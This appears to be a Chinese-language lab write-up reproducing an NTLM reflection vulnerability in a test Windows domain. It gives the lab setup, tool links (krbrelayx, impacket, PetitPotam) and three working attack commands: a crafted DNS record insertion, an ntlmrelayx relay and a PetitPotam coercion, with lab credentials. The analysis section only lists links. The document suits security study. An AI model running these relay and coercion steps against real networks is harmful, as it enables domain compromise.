# 前言
真应了那句话，环境搭建2小时，漏洞复现5分钟，前前后后折腾了好久，最终方案：我的宿主机是Mac 15.3.2，PD下虚拟化的Win2019、Win10，VMware Fusion下虚拟化的Kali，均使用桥接。

期间试过用PD下的Win10作为攻击机，但是涉及445端口占用问题，也试过PD下安装kali，可是怎么也装不上，干脆不折腾了

# 系统下载
https://msdn.itellyou.cn/  
https://next.itellyou.cn/  

# 域环境搭建
【搭建一个简单的Windows域环境】https://blog.csdn.net/qq_28205153/article/details/113827476

参见上述文章即可

# 漏洞复现
【谢公子的复现分析】https://mp.weixin.qq.com/s/x1ZtxBAWx-eNS4WCaUagfg  
【狼组的复现分析】https://mp.weixin.qq.com/s/Ew9OULVjM-zLAxpMsaUyvQ  
【漏洞作者】https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025  

域：test.local  
域控（Win2019）：172.20.10.4  
受害机（Win10）：172.20.10.5  
攻击机（Kali）：172.20.10.2  

https://github.com/dirkjanm/krbrelayx  
https://github.com/fortra/impacket/releases/download/impacket_0_12_0/impacket-0.12.0.tar.gz  
（注意：impacket不要用master分支的版本，截止到2025.06.29，master分支的版本是0.13.0.dev0，里面的代码有更新，会导致脚本执行失败）  
https://github.com/topotam/PetitPotam  
下载上述三个工具  

```
python3 dnstool.py -u 'test.local\john' -p 'nongxinL878' -r ca1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA -d 172.20.10.2 --action add 172.20.10.4
```
![image](./image/01.png)


```
python3 ntlmrelayx.py -t 172.20.10.5 -smb2support -ts
```
![image](./image/02.png)


```
python3 PetitPotam.py -d test.local -u john -p nongxinL878 ca1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 172.20.10.5
```
![image](./image/03.png)
如图所示，表示漏洞可能被修补了

下图是漏洞没被修补的输出  
![image](./image/04.png)

# 漏洞分析
【谢公子的复现分析】https://mp.weixin.qq.com/s/x1ZtxBAWx-eNS4WCaUagfg

【狼组的复现分析】https://mp.weixin.qq.com/s/Ew9OULVjM-zLAxpMsaUyvQ

【漏洞作者】https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025

# 漏洞挖掘